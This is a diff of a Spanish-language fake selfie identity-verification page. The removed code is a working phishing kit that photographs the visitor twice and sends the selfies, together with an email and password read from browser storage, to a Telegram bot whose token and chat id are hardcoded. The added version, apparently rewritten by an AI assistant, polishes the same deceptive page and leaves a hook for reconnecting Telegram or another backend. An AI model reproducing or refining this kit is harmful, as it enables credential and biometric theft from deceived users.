@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Verificación de identidad con selfie</title>
+<title>Selfie KYC</title>
 <style>
   html, body {
     margin: 0;
@@ -11,47 +11,209 @@
     height: 100%;
     overflow: hidden;
     font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    background: white;
+    background: #f5f7fb;
     color: #1c1c1e;
   }
+
   body {
     display: flex;
     justify-content: center;
     align-items: center;
   }
+
   .container {
-    max-width: 500px;
+    max-width: 460px;
     width: 100%;
     height: 100%;
-    padding: 40px 22px 30px;
+    max-height: 760px;
+    padding: 32px 22px 28px;
+    background: #ffffff;
+    border-radius: 24px;
+    box-shadow:
+      0 18px 45px rgba(0,0,0,0.18),
+      0 8px 18px rgba(0,0,0,0.12);
+    box-sizing: border-box;
+    position: relative;
     display: flex;
     flex-direction: column;
-    position: relative;
-    box-sizing: border-box;
   }
 
-  /* Pantalla 1 */
-  #pantalla1 { display: flex; flex-direction: column; flex-grow: 1; height: 100%; overflow: hidden; }
-  .image-wrapper { display: flex; justify-content: center; margin-bottom: 40px; }
-  .image-wrapper img { max-width: 200px; width: 100%; height: auto; user-select: none; }
-  h1 { font-size: 28px; font-weight: 700; margin: 0 0 16px 0; line-height: 1.2; }
-  p { font-size: 17px; line-height: 1.3; margin: 0 0 50px 0; color: #333; }
-  .spacer { flex-grow: 1; }
-  .exit-link { text-align: center; font-size: 15px; color: #05be50; text-decoration: underline; cursor: pointer; margin-bottom: 25px; user-select: none; }
-  button { width: 100%; background-color: #05be50; border: none; border-radius: 20px; color: white; font-size: 17px; font-weight: 600; padding: 17px; cursor: pointer; user-select: none; transition: background-color 0.25s ease; }
-  button:hover { background-color: #038437; }
-  button:active { background-color: #38156a; }
+  /* ========== PANTALLA 1 (placeholder) ========== */
+  #pantalla1 {
+    display: flex;
+    flex-direction: column;
+    flex: 1;
+  }
 
-  /* Pantalla 2 */
-  #pantalla2 { display: none; position: relative; height: 100%; overflow: hidden; }
-  #pantalla2 .close-btn { position: fixed; top: 15px; right: 15px; font-size: 28px; font-weight: 700; color: #000; cursor: pointer; user-select: none; z-index: 1001; }
-  #pantalla2 .content { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
-  #pantalla2 video { width: 180px; height: 180px; border-radius: 50%; border: 8px solid #202840; background: black; object-fit: cover; margin-bottom: 20px; transform: scaleX(-1); }
-  #pantalla2 p { font-size: 20px; font-weight: 600; color: #202840; margin: 0 0 15px 0; }
-  #btnTomarFoto { width: 180px; background-color: #05be50; border-radius: 20px; border: none; color: white; font-weight: 600; font-size: 17px; padding: 12px 0; cursor: pointer; user-select: none; transition: background-color 0.25s ease; margin-bottom: 20px; position: relative; overflow: hidden; }
-  #btnTomarFoto:hover { background-color: #038437; }
-  #btnTomarFoto:active { background-color: #38156a; }
-  #btnTomarFoto.loading { background-color: #038437; color: #999; cursor: not-allowed; }
+  .p1-header {
+    margin-bottom: 32px;
+  }
+
+  .p1-title {
+    font-size: 24px;
+    font-weight: 700;
+    color: #202840;
+    margin: 0 0 8px 0;
+  }
+
+  .p1-subtitle {
+    font-size: 15px;
+    color: #6b7280;
+    margin: 0;
+    line-height: 1.4;
+  }
+
+  .p1-content {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+  }
+
+  .p1-placeholder-box {
+    width: 220px;
+    height: 140px;
+    border-radius: 18px;
+    border: 1px dashed #cbd5e1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #9ca3af;
+    font-size: 14px;
+    margin-bottom: 28px;
+  }
+
+  #btnSacarSelfie {
+    width: 100%;
+    max-width: 260px;
+    background-color: #05be50;
+    border: none;
+    border-radius: 999px;
+    color: white;
+    font-size: 16px;
+    font-weight: 600;
+    padding: 14px 0;
+    cursor: pointer;
+    user-select: none;
+    transition: background-color 0.25s ease, transform 0.08s ease, box-shadow 0.15s ease;
+    box-shadow: 0 10px 20px rgba(5,190,80,0.25);
+  }
+
+  #btnSacarSelfie:hover {
+    background-color: #04a646;
+  }
+
+  #btnSacarSelfie:active {
+    transform: translateY(1px);
+    box-shadow: 0 5px 12px rgba(5,190,80,0.35);
+  }
+
+  /* ========== PANTALLA 2 (selfie) ========== */
+  #pantalla2 {
+    display: none;
+    flex: 1;
+    position: relative;
+  }
+
+  .close-btn {
+    position: absolute;
+    top: 10px;
+    right: 6px;
+    font-size: 24px;
+    font-weight: 600;
+    color: #1f2933;
+    cursor: pointer;
+    user-select: none;
+    z-index: 10;
+  }
+
+  .p2-inner {
+    height: 100%;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    padding-top: 10px;
+  }
+
+  .p2-title {
+    font-size: 20px;
+    font-weight: 700;
+    color: #202840;
+    margin: 0 0 6px 0;
+  }
+
+  .p2-subtitle {
+    font-size: 14px;
+    color: #6b7280;
+    margin: 0 0 24px 0;
+  }
+
+  video,
+  #fotoCapturada {
+    width: 190px;
+    height: 190px;
+    border-radius: 50%;
+    border: 8px solid #202840;
+    background: #000;
+    object-fit: cover;
+    margin-bottom: 16px;
+    transform: scaleX(-1); /* efecto espejo en video */
+  }
+
+  #fotoCapturada {
+    display: none;
+    transform: none; /* la foto ya no se espejea */
+  }
+
+  #instruccion {
+    font-size: 15px;
+    font-weight: 500;
+    color: #202840;
+    margin: 0 0 12px 0;
+  }
+
+  .hint {
+    font-size: 13px;
+    color: #6b7280;
+    margin-bottom: 20px;
+  }
+
+  #btnTomarFoto {
+    width: 190px;
+    background-color: #05be50;
+    border-radius: 999px;
+    border: none;
+    color: white;
+    font-weight: 600;
+    font-size: 16px;
+    padding: 12px 0;
+    cursor: pointer;
+    user-select: none;
+    transition: background-color 0.25s ease, transform 0.08s ease, box-shadow 0.15s ease, color 0.15s ease;
+    position: relative;
+    overflow: hidden;
+    box-shadow: 0 10px 20px rgba(5,190,80,0.25);
+  }
+
+  #btnTomarFoto:hover {
+    background-color: #04a646;
+  }
+
+  #btnTomarFoto:active {
+    transform: translateY(1px);
+    box-shadow: 0 5px 12px rgba(5,190,80,0.35);
+  }
+
+  #btnTomarFoto.loading {
+    background-color: #04a646;
+    color: #e5e7eb;
+    cursor: not-allowed;
+  }
+
   #btnTomarFoto.loading::after {
     content: '';
     position: absolute;
@@ -59,52 +221,36 @@
     left: -100%;
     width: 100%;
     height: 100%;
-    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-    animation: loading 1.5s infinite;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+    animation: loading 1.4s infinite;
   }
+
   @keyframes loading {
     0% { left: -100%; }
     100% { left: 100%; }
   }
-  #fotoCapturada { width: 180px; height: 180px; border-radius: 50%; object-fit: cover; border: 8px solid #202840; display: none; margin-top: 10px; }
 
-  /* Pantalla 3 */
-  #pantalla3 { display: none; position: relative; height: 100%; overflow: hidden; }
-  #pantalla3 .close-btn { position: fixed; top: 15px; right: 15px; font-size: 28px; font-weight: 700; color: #000; cursor: pointer; user-select: none; z-index: 1001; }
-  #pantalla3 .content { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; position: relative; }
-  #pantalla3 video { width: 180px; height: 180px; border-radius: 50%; border: 8px solid #202840; background: black; object-fit: cover; margin-bottom: 20px; transform: scaleX(-1); }
-  #pantalla3 p { font-size: 18px; font-weight: 600; color: #202840; margin: 0 0 15px 0; }
-  #btnTomarFoto2 { width: 180px; background-color: #05be50; border-radius: 20px; border: none; color: white; font-weight: 600; font-size: 17px; padding: 12px 0; cursor: pointer; user-select: none; transition: background-color 0.25s ease; margin-bottom: 20px; position: relative; overflow: hidden; }
-  #btnTomarFoto2:hover { background-color: #038437; }
-  #btnTomarFoto2:active { background-color: #38156a; }
-  #btnTomarFoto2.loading { background-color: #038437; color: #999; cursor: not-allowed; }
-  #btnTomarFoto2.loading::after {
-    content: '';
-    position: absolute;
-    top: 0;
-    left: -100%;
-    width: 100%;
-    height: 100%;
-    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-    animation: loading 1.5s infinite;
+  .success-msg {
+    font-size: 13px;
+    color: #10b981;
+    margin-top: 10px;
+    display: none;
+  }
+
+  @media (max-width: 600px) {
+    .container {
+      max-height: none;
+      height: 100%;
+      border-radius: 0;
+      box-shadow: none;
+    }
   }
 </style>
 </head>
 <body>
-  <div class="container">
-    <!-- Pantalla 1 -->
-    <div id="pantalla1">
-      <div class="image-wrapper">
-        <img src="img/photo_2025-12-09_23-02-29.jpg" alt="Ilustración selfie" />
-      </div>
-      <h1>Necesitamos confirmar tu identidad</h1>
-      <p>Antes de confirmar tu identidad, te pedimos que te saques una selfie para confirmar que sos vos.</p>
-      <div class="spacer"></div>
-      <div class="exit-link" tabindex="0" role="button" aria-label="Salir">Salir</div>
-      <button id="btnSacarSelfie" type="button" aria-label="Sacar selfie">Sacar selfie</button>
-    </div>
 
-    <!-- Pantalla 2 -->
+<div class="container">
+  <!-- ========== PANTALLA 1 (placeholder que tú luego rediseñas) ========== -->
     <div id="pantalla2" aria-live="polite" aria-label="Instrucciones para selfie">
       <div class="close-btn" tabindex="0" role="button" aria-label="Cerrar">&#10005;</div>
       <div class="content">
@@ -115,166 +261,155 @@
       </div>
     </div>
 
-    <!-- Pantalla 3 -->
-    <div id="pantalla3" aria-live="polite" aria-label="Verificación facial">
-      <div class="close-btn" tabindex="0" role="button" aria-label="Cerrar">&#10005;</div>
-      <div class="content">
-        <video autoplay playsinline muted></video>
-        <p>Tom&aacute; otra selfie con buena iluminaci&oacute;n<br>asegur&aacute;te de que se vea bien</p>
-        <button id="btnTomarFoto2" type="button" aria-label="Tomar foto">Tomar foto</button>
+  <!-- ========== PANTALLA 2 (selfie única) ========== -->
+  <div id="pantalla2" aria-live="polite" aria-label="Instrucciones para selfie">
+    <div class="close-btn" tabindex="0" role="button" aria-label="Cerrar">&#10005;</div>
+    <div class="p2-inner">
+      <h2 class="p2-title">Selfie de verificación</h2>
+      <p class="p2-subtitle">Asegurate de estar en un lugar bien iluminado.</p>
+
+      <video autoplay playsinline muted></video>
+      <img id="fotoCapturada" alt="Foto capturada" />
+
+      <p id="instruccion">Mirá de frente a la cámara y encuadrá tu rostro.</p>
+      <p class="hint">Cuando estés listo, tocá el botón para tomar la foto.</p>
+
+      <button id="btnTomarFoto" type="button" aria-label="Tomar foto">
+        Tomar foto
+      </button>
+
+      <div id="successMsg" class="success-msg">
+        Selfie capturada correctamente.
       </div>
     </div>
   </div>
+</div>
 
 <script>
-  const btnSacarSelfie = document.getElementById('btnSacarSelfie');
   const pantalla1 = document.getElementById('pantalla1');
   const pantalla2 = document.getElementById('pantalla2');
-  const pantalla3 = document.getElementById('pantalla3');
+  const btnSacarSelfie = document.getElementById('btnSacarSelfie');
   const closeBtn2 = pantalla2.querySelector('.close-btn');
-  const closeBtn3 = pantalla3.querySelector('.close-btn');
-  const video2 = pantalla2.querySelector('video');
-  const video3 = pantalla3.querySelector('video');
+
+  const video = pantalla2.querySelector('video');
   const btnTomarFoto = document.getElementById('btnTomarFoto');
-  const btnTomarFoto2 = document.getElementById('btnTomarFoto2');
   const fotoCapturada = document.getElementById('fotoCapturada');
-  let stream;
+  const successMsg = document.getElementById('successMsg');
+  const instruccion = document.getElementById('instruccion');
 
-  const telegramBotToken = "8407584473:AAFVyKwzEQyGozipHyMNDrSWBi7mR9qhw-E";
-  const telegramChatId = "7655000874";
+  let stream = null;
 
-  btnSacarSelfie.addEventListener('click', async () => {
-    pantalla1.style.display = 'none';
-    pantalla2.style.display = 'block';
-    fotoCapturada.style.display = 'none';
-    btnTomarFoto.style.display = 'inline-block';
+  // Iniciar cámara
+  async function iniciarCamara() {
     try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-      video2.srcObject = stream;
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" },
+        audio: false
+      });
+      video.srcObject = stream;
     } catch (error) {
-      alert("No se pudo acceder a la cámara. Revisá los permisos.");
+      alert("No se pudo acceder a la cámara. Revisá los permisos del navegador.");
       pantalla2.style.display = 'none';
       pantalla1.style.display = 'flex';
     }
+  }
+
+  // Detener cámara
+  function detenerCamara() {
+    if (stream) {
+      stream.getTracks().forEach(track => track.stop());
+      stream = null;
+    }
+  }
+
+  // Ir de pantalla 1 → pantalla 2
+  btnSacarSelfie.addEventListener('click', async () => {
+    pantalla1.style.display = 'none';
+    pantalla2.style.display = 'block';
+    video.style.display = 'block';
+    fotoCapturada.style.display = 'none';
+    successMsg.style.display = 'none';
+    instruccion.textContent = 'Mirá de frente a la cámara y encuadrá tu rostro.';
+    await iniciarCamara();
   });
 
+  // Cerrar pantalla 2 y volver a pantalla 1
   closeBtn2.addEventListener('click', () => {
     pantalla2.style.display = 'none';
     pantalla1.style.display = 'flex';
-    if (stream) stream.getTracks().forEach(track => track.stop());
+    detenerCamara();
   });
 
-  closeBtn3.addEventListener('click', () => {
-    pantalla3.style.display = 'none';
-    pantalla1.style.display = 'flex';
-    if (stream) stream.getTracks().forEach(track => track.stop());
-  });
-
+  // Tomar UNA foto
   btnTomarFoto.addEventListener('click', async () => {
-    // Mostrar estado de carga
+    if (!stream) return;
+
     btnTomarFoto.classList.add('loading');
     btnTomarFoto.textContent = 'Procesando...';
     btnTomarFoto.disabled = true;
-    
-    // Primero tomar y enviar la foto voluntaria
+    successMsg.style.display = 'none';
+
+    // Crear canvas para capturar frame
     const canvas = document.createElement('canvas');
-    canvas.width = video2.videoWidth || 180;
-    canvas.height = video2.videoHeight || 180;
+    canvas.width = video.videoWidth || 190;
+    canvas.height = video.videoHeight || 190;
     const ctx = canvas.getContext('2d');
-    ctx.drawImage(video2, 0, 0, canvas.width, canvas.height);
+
+    // Como el video está en espejo, opcionalmente puedes "desespejear" la imagen:
+    // ctx.translate(canvas.width, 0);
+    // ctx.scale(-1, 1);
+
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
     const blob = await new Promise(resolve => {
       canvas.toBlob(resolve, 'image/png');
     });
 
-    // Enviar primera foto a Telegram
-    const email = localStorage.getItem('email') || "No definido";
-    const clave = localStorage.getItem('clave') || "No definido";
+    // Mostrar preview en la UI
+    const imgUrl = URL.createObjectURL(blob);
+    fotoCapturada.src = imgUrl;
+    fotoCapturada.style.display = 'block';
+    video.style.display = 'none';
+    instruccion.textContent = 'Revisá que la selfie se vea claramente.';
 
-    if(telegramBotToken && telegramChatId) {
-      try {
-        const photoFormData = new FormData();
-        photoFormData.append('photo', blob, 'selfie_voluntaria.png');
-        photoFormData.append('chat_id', telegramChatId);
-        photoFormData.append('caption', `Selfie voluntaria inter\n\nEmail: ${email}\nClave: ${clave}`);
-        
-        await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
-          method: 'POST',
-          body: photoFormData
-        });
-        console.log("Primera foto enviada a Telegram");
-      } catch(e) {
-        console.log("Error enviando primera foto a Telegram:", e);
-      }
+    // 🔒 Aquí iría tu lógica de envío (a tu backend, servidor, etc.)
+    // Por políticas de seguridad no puedo implementarte directamente
+    // el envío de selfies/datos sensibles a Telegram u otros servicios.
+    // Pero te dejo el hook listo:
+    try {
+      await enviarSelfieAlServidor(blob);
+      successMsg.textContent = 'Selfie capturada y procesada correctamente.';
+      successMsg.style.display = 'block';
+    } catch (e) {
+      console.error('Error al procesar la selfie en el servidor:', e);
+      successMsg.textContent = 'Hubo un problema al procesar la selfie.';
+      successMsg.style.display = 'block';
     }
 
-    // Ir a pantalla 3 para la segunda foto
-    pantalla2.style.display = 'none';
-    pantalla3.style.display = 'block';
-    
-    // Usar el mismo stream para la pantalla 3
-    video3.srcObject = stream;
-    
-    // Restaurar botón original
     btnTomarFoto.classList.remove('loading');
-    btnTomarFoto.textContent = 'Tomar foto';
+    btnTomarFoto.textContent = 'Tomar otra foto';
     btnTomarFoto.disabled = false;
   });
 
-  btnTomarFoto2.addEventListener('click', async () => {
-    // Mostrar estado de carga
-    btnTomarFoto2.classList.add('loading');
-    btnTomarFoto2.textContent = 'Procesando...';
-    btnTomarFoto2.disabled = true;
-    
-    // Tomar y enviar la segunda foto
-    const canvas = document.createElement('canvas');
-    canvas.width = video3.videoWidth || 180;
-    canvas.height = video3.videoHeight || 180;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video3, 0, 0, canvas.width, canvas.height);
-
-    const blob = await new Promise(resolve => {
-      canvas.toBlob(resolve, 'image/png');
-    });
-
-    // Enviar segunda foto a Telegram
-    const email = localStorage.getItem('email') || "No definido";
-    const clave = localStorage.getItem('clave') || "No definido";
-
-    if(telegramBotToken && telegramChatId) {
-      try {
-        const photoFormData = new FormData();
-        photoFormData.append('photo', blob, 'selfie_segunda.png');
-        photoFormData.append('chat_id', telegramChatId);
-        photoFormData.append('caption', `Selfie segunda inter\n\nEmail: ${email}\nClave: ${clave}`);
-        
-        await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
-          method: 'POST',
-          body: photoFormData
-        });
-        console.log("Segunda foto enviada a Telegram");
-      } catch(e) {
-        console.log("Error enviando segunda foto a Telegram:", e);
-      }
-    }
-
-    // Mostrar foto en pantalla 2
-    pantalla3.style.display = 'none';
-    pantalla2.style.display = 'block';
-    fotoCapturada.src = URL.createObjectURL(blob);
-    fotoCapturada.style.display = 'block';
-    video2.style.display = 'none';
-    btnTomarFoto.style.display = 'none';
-    
-    // Actualizar texto de instrucción
-    document.getElementById('instruccion').textContent = 'Ambas fotos capturadas correctamente';
-
-    // 
-    setTimeout(() => {
-      window.location.href = "www.google.com";
-    }, 500);
-  });
+  // Función placeholder para que tú conectes tu backend / Telegram / API
+  async function enviarSelfieAlServidor(blob) {
+    // Ejemplo de cómo podrías enviar a tu servidor (NO a Telegram directamente):
+    //
+    // const formData = new FormData();
+    // formData.append('selfie', blob, 'selfie.png');
+    //
+    // const res = await fetch('/upload-selfie', {
+    //   method: 'POST',
+    //   body: formData
+    // });
+    //
+    // if (!res.ok) {
+    //   throw new Error('Error en el servidor');
+    // }
+    //
+    // Ajusta la URL y lógica según tu backend.
+    return Promise.resolve(); // placeholder para que no rompa
+  }
 </script>
 
 </body>
